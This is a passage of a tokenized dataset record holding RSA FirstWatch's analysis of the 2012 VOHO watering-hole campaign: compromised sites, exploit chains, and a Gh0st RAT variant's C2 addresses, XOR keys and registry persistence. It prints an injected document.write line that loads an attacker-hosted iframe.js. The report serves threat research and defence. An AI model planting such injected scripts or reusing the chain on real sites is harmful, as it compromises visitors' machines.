"P33", "h": 101, "t": 108, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586]}, {"old_id": "R25", "r": "P21", "h": 122, "t": 125, "evidence": [729]}, {"old_id": "R26", "r": "P21", "h": 123, "t": 125, "evidence": []}, {"old_id": "R27", "r": "P21", "h": 124, "t": 125, "evidence": []}, {"old_id": "R28", "r": "P21", "h": 126, "t": 131, "evidence": [733, 734, 735]}, {"old_id": "R29", "r": "P21", "h": 127, "t": 131, "evidence": [734, 735]}, {"old_id": "R30", "r": "P21", "h": 128, "t": 131, "evidence": [735]}, {"old_id": "R31", "r": "P21", "h": 129, "t": 132, "evidence": [736]}, {"old_id": "R32", "r": "P21", "h": 130, "t": 133, "evidence": [737]}, {"old_id": "R33", "r": "P21", "h": 134, "t": 142, "evidence": []}, {"old_id": "R34", "r": "P21", "h": 135, "t": 142, "evidence": []}, {"old_id": "R35", "r": "P21", "h": 136, "t": 142, "evidence": []}, {"old_id": "R36", "r": "P21", "h": 137, "t": 142, "evidence": []}, {"old_id": "R37", "r": "P21", "h": 138, "t": 143, "evidence": [751, 752, 753, 754]}, {"old_id": "R38", "r": "P21", "h": 139, "t": 143, "evidence": [751, 752, 753, 754]}, {"old_id": "R39", "r": "P21", "h": 140, "t": 143, "evidence": [751, 752, 753, 754]}, {"old_id": "R40", "r": "P21", "h": 141, "t": 143, "evidence": [751, 752, 753, 754]}], "title": ["inputs/txt/201209RSAFirstWatchVOHO"], "sents": [["THE", "VOHO", "CAMPAIGN:", "AN", "IN", "DEPTH"], ["ANALYSIS"], ["RSA", "FirstWatchSM", "Intelligence", "Report"], ["White", "Paper"], ["In", "July", "of", "2012", ",", "the", "RSA", "FirstWatchSM", "research", "and", "intelligence", "team", "identified", "an"], ["emerging", "malicious", "code", "and", "content", "campaign", "spreading", "at", "a", "rapid", "rate", "within", "very"], ["About", "RSA", "FirstWatchS", "M", "Team"], ["specific", "geographic", "theaters", ".", "These", "clusters", "were", "confined", "to", "ten", "geographic", "areas"], ["RSA", "FirstWatchSM", "team", "is", "an", "elite", ",", "highly"], ["trained", "global", "threat", "research", "and"], ["intelligence", "team", "designed", "to", "operate", "in"], ["a", "number", "of", "disciplines", "to", "provide"], ["tactical", "and", "strategic", "intelligence", "on"], ["advanced", "threats", ",", "threat", "campaigns", "and"], ["threat", "actors", ".", "The", "team", ",", "lead", "by", "Will"], ["Gragido", ",", "focuses", "on", "advanced", "threat"], ["research", "and", "intelligence", "which"], ["culminates", "in", "threat", "feeds", ",", "digests", ","], ["profiles", "and", "ecosystem", "analysis"], ["designed", "to", "aid", "the", "RSA", "NetWitness\u00ae"], ["user", "community", "and", "the", "information"], ["security", "community", "at", "large", "in"], ["contending", "with", "these", "challenges", "."], ["and", "involved", "thousands", "of", "hosts", ".", "To", "the", "untrained", "eye", "it", "would", "appear", "the", "hosts"], ["Contributing", "Authors"], ["Alex", "Cox", ",", "Principal", "Researcher", ",", "RSA"], ["FirstWatch", "Team"], ["Chris", "Elisan", ",", "Principal", "Malware"], ["Researcher", ",", "RSA", "FirstWatch", "Team"], ["Will", "Gragido", ",", "Sr", ".", "Manager,", "RSA"], ["FirstWatch", "Team"], ["Chris", "Harrington", ",", "Consulting", "Security"], ["Engineer", ",", "EMC", "CIRC"], ["Jon", "McNeill", ",", "Principal", "Technologist", ",", "RSA"], ["FirstWatch", "Team"], ["involved", "in", "this", "campaign", "were", "compromised", "as", "the", "result", "of", "innocent", "web", "surfing"], ["using", "a", "common", "\u201cdrive-by\u201d", "attack", "mechanism", ".", "While", "at", "face", "value", "this", "is", "true", ",", "our"], ["investigation", "infers", "that", "the", "populations", "compromised", "were", "not", "chosen", "in", "an"], ["indiscriminate", "manner", ",", "but", "rather", "with", "great", "forethought", ".", "Based", "on", "the", "RSA"], ["FirstWatch", "research", ",", "we", "believe", "these", "websites", "were", "likely", "chosen", "with", "exact"], ["precision", "and", "great", "consideration;", "selected", "from", "thousands", "upon", "thousands", "of"], ["websites", "due", "to", "familiarity", "and", "proximity", "to", "the", "targets", "of", "interest", "that", "the", "threat"], ["actors", "responsible", "for", "the", "campaign", "were", "truly", "interested", "in", "compromising", "."], ["The", "RSA-FirstWatch", "team\u2019s", "research", "led", "to", "the", "identification", "of", "this", "campaign", "and", "its"], ["name", ",", "\u2018VOHO\u2019", ".", "From", "a", "tools", ",", "technique", "and", "procedure", "(TTP)", "perspective", ",", "the", "RSA"], ["FirstWatch", "team", "believes", "this", "campaign", "aligns", "with", "the", "Advanced", "Persistent", "Threat"], ["(APT)", "threat", "model", ",", "including", "communications", "emitting", "from", "compromised", "hosts", "to"], ["IP", "addresses", "confirmed", "as", "Command", "and", "Control", "(C2)", "servers", "(in", "this", "case", ",", "located"], ["in", "Hong", "Kong);", "code", "re-use", "using", "exploit", "scripts", "and", "ultimately", ",", "a", "before-unseen"], ["variant", "of", "\u201cGh0st", "RAT\u201d", "malware", ".", "Additionally", ",", "targets", "appeared", "to", "be", "specifically"], ["chosen", "to", "compromise", "hosts", "involved", "in", "business", "and", "local", "governments", "in"], ["Washington", ",", "DC", "and", "Boston", ",", "Massachusetts", ",", "as", "well", "as", "organizations", "involved", "the"], ["development", "and", "promotion", "of", "democratic", "process", "in", "non-permissive", "regions", ".", "As", "a"], ["whole", ",", "these", "specific", "TTPs", "have", "been", "observed", "in", "previous", "APT", "attack", "campaigns", ","], ["most", "notably", ",", "Aurora", "i", "and", "Ghostnet", "ii", "."], ["Through", "our", "research", ",", "the", "RSA", "FirstWatch", "team", "identified", "what", "it", "believes", "to", "be", "the"], ["primary", "mechanism", "for", "tactical", "and", "strategic", "infection", "of", "victims", "affiliated", "with"], ["targets", "of", "opportunity", ".", "While", "this", "attack", "methodology", "has", "been", "observed", "before", ",", "it"], ["has", "not", "been", "widely", "documented", "or", "disseminated", ".", "As", "such", ",", "we", "have", "termed", "this"], ["technique", "\u2018Water", "Holing\u2019", "."], ["The", "architects", "of", "these", "campaigns", "survey", "and", "select", "the", "websites", "(known", "as", "pivot", "or"], ["redirector", "sites)", "leveraged", "in", "these", "attacks", "carefully", ".", "Weighing", "their", "geographic"], ["relevance", ",", "proximity", "to", "their", "desired", "targets", "of", "opportunity", ",", "and", "likelihood", "of", "being"], ["traversed", "by", "potential", "victim-users", "associated", "with", "the", "attacker", "objective", ",", "the"], ["adversary", "carefully", "exploits", "vulnerable", "systems", "and", "inserts", "malicious", "scripts", "to"], ["deliver", "a", "Trojan", "payload", "via", "browser-based", "exploits", "to", "visitors", "to", "the", "website", "."], ["Throughout", "this", "paper", ",", "we", "will", "examine", "the", "evolution", "of", "this", "threat", "campaign", ",", "its", "ties"], ["to", "other", "comparable", "threat", "campaigns", "where", "variants", "of", "the", "malicious", "payload", "seen"], ["in", "this", "attack", "(gh0strat)", "have", "been", "identified", "and", "chronicled", ",", "epicenters", "of"], ["geographic", "activity", "associated", "with", "this", "campaign", ",", "industry/verticals", "targeted", "in", "this"], ["campaign", "and", "the", "construction", "of", "the", "attribution", "chain", "."], ["2"], ["Specifics"], ["Using", "the", "tactic", "of", "crafting", "a", "\u201cWatering", "Hole\u201d", ",", "the", "majority", "of", "the", "redirection", "activity", "occurred"], ["because", "of", "JavaScript", "elements", "on", "two", "specific", "websites", "."], ["\u2022"], ["hxxp://www", ".", "xxxxxxxxtrust.com"], ["\u2022"], ["hxxp://xxxxxxcountymd", ".", "gov"], ["Respectively", ",", "these", "two", "sites", "\u2013", "one", "a", "regional", "bank", "in", "Massachusetts", "and", "a", "local", "government"], ["serving", "the", "Washington", "DC", "suburbs", "."], ["We", "also", "saw", "an", "additional", "chain", "of", "websites", "with", "a", "geopolitical", "central", "theme", "redirecting", "to", "the"], ["exploit", "site:"], ["\u2022"], ["hxxp://ifxx", ".", "org"], ["\u2022"], ["hxxp://xxxxxxcenter", ".", "org"], ["\u2022"], ["hxxp://xxi", ".", "org"], ["\u2022"], ["hxxp://xxxxxxx", ".", "prio.no"], ["\u2022"], ["hxxp:/xxxxxxxxpolitics", ".", "com"], ["\u2022"], ["hxxp://www", ".", "rfxxx.org"], ["Additionally", ",", "sites", "serving", "the", "Defense", "Industrial", "Base", "and", "Educational", "community", "were", "also"], ["observed", "redirecting", "to", "the", "exploit", "site:"], ["\u2022"], ["hxxp://www", ".", "gftxxx.org"], ["\u2022"], ["hxxp://www", ".", "xxxxxxantennas.com"], ["When", "taken", "as", "a", "whole", ",", "this", "campaign", "appears", "to", "have", "targeted:"], ["\u2022"], ["Boston", ",", "Massachusetts", "area", "users"], ["\u2022"], ["Political", "Activists"], ["\u2022"], ["Users", "Washington", ",", "DC", "and", "its", "suburbs"], ["\u2022"], ["Defense", "Industrial", "Base"], ["\u2022"], ["Education"], ["Malicious", "Infrastructure"], ["Hosts", "visiting", "the", "aforementioned", "sites", "were", "redirected", "to", "a", "website", "of", "enthusiasts", "of", "a", "lesser"], ["known", "sport", "at", "the", "following", "domain:"], ["hxxp://xxxxxxxcurling", ".", "com"], ["This", "site", "attempted", "to", "exploit", "the", "following", "host", "vulnerabilities", ",", "in", "two", "different", "attack"], ["campaigns:"], ["\u2022"], ["Microsoft", "XML", "Core", "Services", "\u2013", "CVE-2012-1889"], ["\u2022"], ["Java", "Exploit", "\u2013", "CVE-2012-1723"], ["Once", "successfully", "exploited", ",", "the", "installed", "\u201cGh0st", "RAT\u201d", "would", "beacon", "to", "one", "of", "two", "IP"], ["addresses:"], ["\u2022"], ["58", ".", "64.155.59"], ["\u2022"], ["58", ".", "64.155.57"], ["3"], ["Exploit", "Specifics"], ["Attack", "Methodology", "Overview"], ["hxxp://xxxxxxxcurling", ".", "com", "Compromise"], ["Files", "found", "on", "the", "sporting", "group", "website", "indicate", "that", "this", "server", "was", "likely", "compromised", "with"], ["a", "remote", "buffer", "overflow", "(CVE-2008-3869/CVE-2008-3870)", "against", "the", "server\u2019s", "sadmind"], ["daemon", ".", "Additional", "files", "indicated", "the", "ability", "to", "establish", "a", "remote", "shell", "on", "demand", "."], ["It", "is", "unknown", "if", "this", "method", "was", "also", "used", "to", "compromise", "the", "\u201cwatering", "hole\u201d", "sites", ".", "In", "these"], ["cases", ",", "the", "following", "code", "snipped", "was", "added", "to", "publically", "accessible", "pages", "on", "the", "site", ","], ["typically", "", ".", "js", "files", "are", "used", "to", "process", "a", "site\u2019s", "JavaScript:"], ["document", ".", "write('<script"], ["src=\"http://www", ".", "*******curling.com/Docs/BW06/iframe.js\"></script>');"], ["This", "is", "a", "simple", "redirection", "mechanism", "that", "will", "cause", "the", "browser", "to", "redirect", "and", "load", "content"], ["from", "the", "remote", "site", "."], ["Hits", "to", "\u201ciframe", ".", "js\u201d", "launch", "an", "enumeration", "and", "exploit", "chain", "that"], ["attempts", "to", "exploit", "two", "different", "vulnerabilities", ","], ["Gh0st", "RAT", "is", "a", "multiple-purpose", "remote", "access", "tool", "that", "allows", "extensive", "remote", "control", "of"], ["compromised", "hosts", "."], ["While", "there", "is", "no", "known", "evidence", "linking", "this", "attack", "to", "previous", "attacks", ","], ["gh0st", "has", "historically", "been", "used", "in", "politically", "motivated", "espionage", "by", "nation-state", "attackers", ",", "in"], ["a", "similar", "manner", "as", "seen", "in", "this", "campaign", "depending", "on", "the", "specific", "redirection", "path:"], ["\u2022"], ["Microsoft", "XML", "Core", "Services", "\u2013", "CVE-2012-1889"], ["\u2022"], ["Java", "Exploit", "\u2013", "CVE-2012-1723"], ["Phase", "1", "-", "Exploit", "Chain", "\u2013", "Microsoft", "XML", "Core", "Services"], ["From", "our", "research", ",", "this", "campaign", "occurred", "between", "June", "25th", ",", "2012", "and", "July", "18th", "2012", "in"], ["which", "attackers", "sought", "to", "exploit", "the", "CVE-2012-1889", "vulnerability", "that", "was", "zero-day", "and", "was"], ["being", "used", "in", "targeted", "attacks", "as", "noted", "in", "early", "June", "iii", "."], ["In", "this", "attack", ",", "a", "successful", "exploit", "on", "CVE-2012-1889", "followed", "the", "following", "path:"], ["[Watering", "Hole", "Sites]"], ["http://xxxxxxcountymd", ".", "gov", "(or", "other", "water", "hole", "site)", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/iframe.js", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/module.php", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/engine.js", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/if.htm", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/enblue.htm", "\uf0e0"], ["http://www", ".", "xxxxxxxcurling.com/Results/cx/magma/book.cab"], ["4"], ["", "."], ["Figure", "1:", "iFrame", ".", "js", "Flow"], ["Iframe", ".", "js"], ["Iframe", ".", "js", "checks", "if", "the", "visiting", "machine", "is", "running", "a", "Windows", "operating", "system", "and", "Internet"], ["Explorer", ".", "It", "also", "sets", "a", "cookie", "value", "(presumably", "to", "track", "individual", "visits)", ".", "If", "the", "visiting"], ["machine", "is", "running", "a", "Windows", "operating", "system", "and", "Internet", "Explorer", ",", "it", "forward", "to"], ["module", ".", "php."], ["Module", ".", "php"], ["Module", ".", "php", "uses", "a", "simple", "redirection", "script", "to", "redirect", "the", "browser", "to", "Engine", ".", "js"], ["Engine", ".", "js"], ["Engine", ".", "js", "looks", "for", "processes", "related", "to", "the", "following", "antivirus", "engines", "using", "an", "older"], ["vulnerability", "in", "Internet", "Explorer", "(CVE-2007-4848)", "that", "allows", "local", "file", "enumeration:"], ["\u2022"], ["Trend", "Micro"], ["\u2022"], ["McAfee"], ["\u2022"], ["Symantec"], ["However", ",", "the", "results", "of", "this", "check", "don\u2019t", "change", "the", "outcome", "of", "the", "script", "running", "in", "all", "cases;"], ["it", "simply", "results", "in", "the", "loading", "of", "\u201cif", ".", "htm\u201d.", "We", "believe", "this", "to", "be", "a", "case", "of", "existing", "exploit"], ["script", "re-use", ",", "with", "slight", "changes", "to", "suit", "the", "attackers", "current", "purpose", "."], ["5"], ["This", "particular", "enumeration", "script", "was", "seen", "previously", "in", "APT-style", "attacks", "back", "in", "July", "of", "2011", ","], ["as", "detailed", "here", "on", "the", "contagiodump", "blog", "iv", ".", "Within", "the", "blog", ",", "noted", "industry", "researcher", "Mila"], ["Parkour", ",", "cited", "the", "presence", "and", "use", "of", "borrowed", "scripts", "having", "likely", "originated", "in", "Asia", ","], ["specifically", "the", "so", "called", "xKungfoo", "script", "in", "attacks", "launched", "associated", "with", "numerous"], ["campaigns", "targeted", "at", "political", "dissidents", ".", "v", "Additionally", ",", "Ms", ".", "Parkour", "has", "also", "noted", "and"], ["documented", "the", "presence", "of", "this", "weaponizable", "code", "in", "numerous", "locales", "on", "the", "Internet"], ["today", ".", "vi", "vii", "In", "the", "following", "figures", "evidence", "of", "the", "presence", "and", "availability", "of", "the", "xKungFoo"], ["script", "(the", "script", "referenced", "by", "Mila", "Parkour", "and", "noted", "as", "being", "germane", "to", "the", "RSA"], ["FirstWatch", "investigation)", "along", "with", "endorsement", "by", "the", "author", "can", "be", "seen:"], ["Figure", "2:", "Website", "Where"], ["xKungFoo", "Script", "Originates"], ["Figure", "3:", "Example", "of", "xKungFoo"], ["Script", "Originates"], ["Figure", "4:", "Endorsement", "by"], ["Author", "Regarding", "xKungFoo"], ["6"], ["If", ".", "htm"], ["1)", "Checks", "if", "the", "visiting", "host\u2019s", "user", "agent", "reflects", "is", "one", "of", "the", "following:"], ["\u2022"], ["Unknown"], ["\u2022"], ["Windows", "XP"], ["\u2022"], ["Windows", "2003"], ["\u2022"], ["Windows", "VistaWindows", "7"], ["Checks", "if", "the", "visiting", "hosts", "language", "settings", "are:"], ["\u2022"], ["English"], ["\u2022"], ["Chinese"], ["\u2022"], ["French"], ["\u2022"], ["German"], ["\u2022"], ["Japanese"], ["\u2022"], ["Portuguese"], ["\u2022"], ["Korean"], ["\u2022"], ["Russian"], ["Enblue", ".", "htm"], ["Enblue", ".", "htm", "uses", "the", "CVE-2012-1889", "XML", "vulnerability", "to", "compromise", "the", "visiting", "browser", ","], ["which", "results", "in", "a", "pull", "and", "installation", "of", "the", "gh0st", "RAT", "malware", "."], ["This", "script", "also", "appears", "to", "be", "code", "reuse", "of", "a", "script", "seen", "on", "pastebin", "as", "follows:"], ["http://pastebin", ".", "com/VfmuhEiq"], ["Interestingly", ",", "this", "code", "was", "also", "purportedly", "used", "in", "previous", "nation-state", "sponsored", "attacks"], ["on", "Gmail", "accounts", "viii", "."], ["Book", ".", "cab"], ["Book", ".", "cab,", "the", "final", "payload", ",", "is", "an", "obfuscated", "executable", "which", ",", "when", "de-obfuscated", "using"], ["XOR", "95", ",", "is", "the", "gh0st", "RAT", "sample", "named", "\u201cvptray", ".", "exe\u201d", "(e6b43"], ["c299a9a1f5abd9be2b729e54577)"], ["Phase", "II", "-", "Exploit", "Chain", "\u2013", "Sun", "Java"], ["Phase", "II", "of", "this", "campaign", ",", "using", "the", "same", "infrastructure", ",", "but", "with", "a", "different", "directory", "for", "the"], ["exploit", "chain", "files", "as", "follows:"], ["[Watering", "Hole", "Sites]"], ["hxxp://xxxxxcountymd", ".", "gov", "(or", "other", "water", "hole", "site)", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/iframe.js", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/module.php", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/engine.js", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/if.htm", "\uf0e0"], ["hxxp://www", ".", "xxxxxxxcurling.com/Docs/BW06/applet.jar"], ["7"], ["Figure", "5:", "Java", "Exploit", "Chain"], ["If", ".", "htm"], ["In", "this", "case", ",", "all", "of", "the", "scripts", "were", "identical", "up", "to", "\u201cif", ".", "htm\u201d,", "which", "instead", "contained", "a", "java", "call"], ["that", "loaded", "applet", ".", "jar,", "as", "well", "as", "a", "large", "blob", "of", "obfuscated", "code", "as", "a", "\u201cparam\u201d", "element", ".", "This"], ["large", "blob", "of", "code", "is", "a", "binary", "obfuscated", "with", "XOR", "77", ",", "which", "the", "java", "applet", "deobfuscates", "and"], ["runs", "as", "\u201csvohost", ".", "exe\u201d", "(2fe340fe2574ae540bd98bd9af8ec67d)", "."], ["Figure", "6:", "Java", "Applet", "Deobfuscates"], ["and", "Runs", "as", "\u201csvohost", ".", "exe\u201d"], ["8"], ["\u201cWatering", "Hole\u201d", "Specifics"], ["Strategically", ",", "the", "idea", "of", "using", "a", "target\u2019s", "interests", "and", "likely", "access", "points", "is", "not", "a", "new", "method"], ["of", "attack", ".", "Undertaking", "it", "on", "such", "a", "large", "scale", ",", "however", ",", "is", "notable", "and", "unusual", "in", "the", "APT"], ["space", "."], ["In", "this", "campaign", ",", "five", "separate", "\u201cclasses\u201d", "of", "sites", "that", "were", "compromised", "and", "trojanized", "to"], ["redirect", "to", "the", "exploit", "chains", "on", "the", "sporting", "group", "website", ".", "They", "were:"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Boston", ",", "MA", "area"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "Political", "Activism"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Washington", ",", "DC", "and", "its", "suburbs"], ["areas"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Defense", "Industrial", "Base"], ["\u2022"], ["Sites", "with", "Geographic", "and", "Target", "Relevance", "to", "the", "Education"], ["Additionally", ",", "there", "were", "a", "spattering", "of", "non-related", "sites", "that", "appeared", "to", "be", "simple"], ["redirectors", "to", "one", "of", "the", "above-categorized", "sites", ".", "This", "sort", "of", "redirector", "is", "often", "used", "in", "spam"], ["campaigns", "to", "obfuscate", "the", "final", "location", "of", "the", "exploit", "server", "in", "an", "attempt", "to", "bypass", "email"], ["malware", "controls", ".", "While", "we", "don\u2019t", "have", "specific", "examples", "of", "related", "spam", "activity", ",", "this", "seems"], ["a", "likely", "such", "use", "of", "the", "additional", "sites", "."], ["One", "of", "the", "main", "sources", "of", "infection", "for", "these", "campaigns", "were", "sites", "that", "support", "the", "cause", "of"], ["democratic", "process", "in", "non-permissive", "environments", ",", "or", "the", "communication", "of", "information"], ["related", "to", "free", "speech", ".", "That", "is", ",", "entities", "and", "people", "that", "seek", "to", "promote", "democratic"], ["government", "in", "countries", "whose", "existing", "political", "structure", "and", "power", "doesn\u2019t", "support", "(and"], ["indeed", ",", "persecutes)", "such", "governmental", "change", ".", "This", "particular", "strategic", "vector", "has", "been"], ["observed", "in", "prior", "nation-state", "sponsored", "attacks", "."], ["Though", "several", "sites", "were", "targeted", "by", "the", "adversarial", "element", "behind", "this", "campaign", "some"], ["stood", "out", "due", "to", "their", "relationships", "to", "matters", "of", "geopolitical", "relevance", ",", "philanthropy", ",", "and"], ["news", "media", ".", "Five", "primary", "sites", "were", "compromised", "and", "used", "as", "pivot", "sites", "from", "a", "water", "holing"], ["perspective", "in", "this", "campaign", "."], ["They", "were", "largely", "North", "American", "with", "the", "exception", "of", "one"], ["European", "example", ".", "Additionally", ",", "a", "large", "percentage", "of", "infection", "activity", "occurred", "as", "a", "result", "of"], ["sites", "compromised", "and", "converted", "into", "water", "holes", "that", "offered", "services", "to", "the", "Washington", ",", "DC"], ["and", "Boston", ",", "MA", "areas", ".", "As", "the", "political", "and", "governmental", "hub", "of", "the", "United", "States", "of", "America", ","], ["wholesale", "compromise", "of", "computers", "in", "this", "area", "would", "provide", "a", "wealth", "of", "intelligence", "for"], ["adversaries", "interested", "in", "political", "process", "and", "government", "action", ".", "Furthermore", "it", "should", "be"], ["noted", "that", "RSA", "FirstWatch", "has", "noted", "and", "verified", "the", "compromise", "of", "nearly", "one", "thousand"], ["unique", "organizations", "distinct", "from", "those", "noted", "within", "this", "work", "."], ["9"], ["Figure", "7:", "Industries", "and", "Regions"], ["Leveraged", "in", "\u201cWater", "Holing\u201d", "Activity"], ["Political"], ["Activism"], ["Metro"], ["Washington", ","], ["DC"], ["\u2022", "Government"], ["\u2022", "Education"], ["\u201cWatering"], ["Hole\u201d", "Pivot"], ["Sites"], ["Defense"], ["Industrial"], ["Base"], ["Metro"], ["Boston"], ["\u2022", "Financial"], ["Svcs"], ["Gh0st", "RAT"], ["RAT", "Overview"], ["Remote", "Access", "Tools\\Trojan", "(RAT)", "are", "typically", "offered", "as", "a", "\u201clegitimate\u201d", "remote", "administration"], ["tool", "for", "system", "administrators", ",", "but", "have", "largely", "been", "used", "for", "remote", "hacking", "and", "information"], ["collection", "for", "intelligence", "purposes", "or", "lateral", "movement", "activities", ".", "While", "they", "are", "similar", "in"], ["function", "to", "purpose-built", "botnets", ",", "which", "also", "tend", "to", "use", "client/server", "architecture", ",", "RATs"], ["typically", "offer", "a", "wide", "range", "of", "features", "rather", "than", "the", "single", "focus", "that", "most", "modern", "botnet"], ["malware", "adheres", "to", "."], ["Typically", ",", "RATs", "have", "the", "ability", "to:"], ["\u2022"], ["Capture", "keystrokes"], ["\u2022"], ["Remote", "monitoring", "of", "webcam", "and/or", "microphone"], ["\u2022"], ["File", "system", "search/browse"], ["\u2022"], ["Use", "of", "local", "command", "prompt"], ["\u2022"], ["Execution", "of", "arbitrary", "programs"], ["\u2022"], ["File", "download/upload"], ["Gh0st", "RAT", "Specifics"], ["Gh0st", "came", "to", "prominence", "following", "the", "2009", "publication", "of", "\u201cTracking", "Ghostnet:", "Investigating"], ["a", "Cyber", "Espionage", "Network\u201d", ",", "in", "which", "this", "malware", "was", "used", "to", "infiltrate", "computers", "associated"], ["with", "the", "Dalai", "Lama", "and", "was", "used", "to", "compromise", "information", "related", "to", "Tibetan", "affairs", "."], ["Gh0st", "contains", "all", "of", "the", "above-mentioned", "capabilities", "when", "successfully", "installed", "on", "a", "target"], ["PC", "."], ["An", "excellent", "overview", "of", "this", "tool", "can", "be", "found", "in", "the", "McAfee", "report", "titled", "\u201cKnow", "your"], ["Digital", "Enemy\u201d", "ix", "."], ["10"], ["Since", "the", "publication", "of", "this", "report", ",", "the", "use", "of", "gh0st", "in", "hacking", "incidents", "has", "exploded", ",", "with"], ["the", "RSA", "FirstWatch", "team", "being", "aware", "of", "at", "least", "50", "unique", "gh0st", "networks", ".", "This", "can", "be"], ["largely", "explained", ",", "much", "like", "the", "proliferation", "of", "ZeuS", "cybercrime", "malware", ",", "to", "the", "open"], ["availability", "of", "Gh0st", "source", "code", "on", "the", "internet", "."], ["When", "source", "code", "for", "this", "type", "of", "malware"], ["is", "available", "globally", "it", "allows", "\u201copen", "source\u201d", "evolution", "of", "the", "malware", "to", "add", "new", "features", "and"], ["capabilities", ",", "but", "more", "importantly", ",", "it", "permits", "the", "constant", "modification", "of", "\u201cindicators\u201d", "used", "by"], ["defenders", "to", "detect", "malware", "activity", "in", "their", "environment", "."], ["From", "an", "operational", "sense", ",", "having"], ["easy", "opportunity", "to", "modify", "source", "code", "allows", "a", "much", "more", "robust", "compromise", ",", "with"], ["decreased", "likelihood", "of", "attacker", "detection", "."], ["In", "many", "cases", "this", "detection", "is", "based", "on:"], ["1)"], ["Knowledge", "of", "known", "C2", "locations"], ["2)"], ["Detection", "of", "a", "common", "\u201cgh0st\u201d", "string", "that", "is", "seen", "in", "the", "network", "communication", "of"], ["\u201cunmodified\u201d", "gh0st", "configurations", "."], ["Figure", "8:", "Common", "Technique"], ["Empolyed", "by", "Gh0st", "Networks"], ["Operators"], ["A", "common", "countermeasure", "used", "by", "operators", "of", "gh0st", "networks", "is", "to", "change", "this", "gh0st", "string"], ["prior", "to", "malware", "compilation", "to", "defeat", "basic", "IDS", "signatures", "."], ["VOHO", "Sample", "Analysis"], ["Fake", "Symantec", "Update", "\u2013", "Variant", "1"], ["VPTray", ".", "EXE"], ["e6b43c299a9a1f5abd9be2b729e54577"], ["This", "malware", "comes", "in", "a", "UPX", "compressed", "binary", ",", "which", "disguises", "itself", "as", "an", "update", "from"], ["Symantec", "but", "instead", "it", "installs", "a", "backdoor", "in", "the", "target", "system", "."], ["When", "the", "malware", "is", "first", "executed", ",", "its", "first", "order", "of", "business", "is", "to", "install", "itself", "in", "the", "system", "."], ["It", "does", "this", "by", "dropping", "an", "exact", "copy", "of", "itself", "with", "the", "name", "VPTray", ".", "EXE", "in", "the", "current", "user\u2019s"], ["\u201cLocal", "Settings\\Temp\u201d", "folder", ".", "It", "then", "modifies", "the", "Windows", "registry", "for", "it", "to", "autostart", "every"], ["boot", "up", ".", "It", "does", "this", "by", "using", "the", "following", "registry", "keys", "."], ["\u2022"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["\u2022"], ["HKEY_USERS\\<User\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["11"], ["By", "using", "the", "HKCU", "and", "HKU", "registry", "hives", ",", "the", "malware", "is", "targeting", "users", "that", "are", "currently"], ["logged", "into", "the", "machine", "when", "the", "initial", "infection", "began", "instead", "of", "the", "machine", "itself", ".", "This"], ["technique", "is", "especially", "useful", "when", "the", "target", "uses", "roaming", "profiles", "."], ["The", "malware", "adds", "the", "value", "\u201cSymantecUpdate\u201d", "to", "these", "keys", "and", "pass", "itself", "off", "as", "an", "update"], ["from", "Symantec", ".", "This", "is", "a", "simple", "technique", "that", "is", "designed", "to", "fool", "the", "untrained", "eye", ".", "To"], ["reinforce", "this", ",", "the", "malware", "employs", "a", "certain", "level", "of", "obfuscation", "to", "hide", "the", "data", ",", "which", "is", "the"], ["location", "and", "filename", "of", "the", "malware", ",", "by", "using", "HEX", "digits", "to", "represent", "each", "string", "characters"], ["instead", "of", "the", "more", "common", "ASCII", "."], ["In", "this", "case", ",", "instead", "of", "the", "data", "being:"], ["C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\VPTray", ".", "exe"], ["It", "is", "represented", "in", "the", "registry", "as:"], ["43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31"], [":5c:54:65:6d:70:5c:56:50:54:72:61:79:2e:65:78:65:00", "."], ["This", "installation", "technique", "of", "dropping", "an", "exact", "copy", "of", "itself", "tells", "us", "that", "the", "malware", "can"], ["survive", "and", "install", "itself", "without", "the", "aid", "of", "a", "dropper", "or", "a", "downloader", ".", "It", "has", "the", "capability", "to"], ["check", "whether", "it", "is", "running", "in", "the", "appropriate", "location", "and", "if", "it", "is", "properly", "installed", "on", "the"], ["system", ".", "If", "not", ",", "it", "proceeds", "with", "the", "installation", "process", ".", "This", "technique", "is", "advantageous", "if", "the"], ["malware", "has", "not", "been", "removed", "properly", ".", "A", "surviving", "main", "component", "can", "recreate", "what", "was"], ["removed", "including", "the", "necessary", "registry", "changes", "needed", "by", "the", "malware", "."], ["Aside", "from", "dropping", "VPTray", ".", "EXE", "it", "also", "drops", "the", "binary", "file", "UP", ".", "BAK", "in", "the", "same", "\u201cLocal"], ["Settings\\Temp\u201d", "folder", ".", "This", "is", "the", "backdoor", "component", "of", "the", "malware", ".", "Once", "all", "of", "these", "are"], ["accomplished", ",", "the", "original", "malware", "passes", "control", "to", "VPTray", ".", "EXE", "and", "then", "deletes", "itself", "to"], ["remove", "any", "traces", "of", "its", "existence", "."], ["Figure", "9:", "Memory", "dump", "of", "the"], ["malware", "containing", "the", "strings", "of"], ["the", "filenames", "of", "the", "dropped", "files"], ["and", "the", "registry", "value", "."], ["12"], ["Once", "the", "malware", "is", "active", "in", "the", "system", "it", "utilizes", "certain", "protective", "mechanisms", "such", "as", "the"], ["following:"], ["\u2022"], 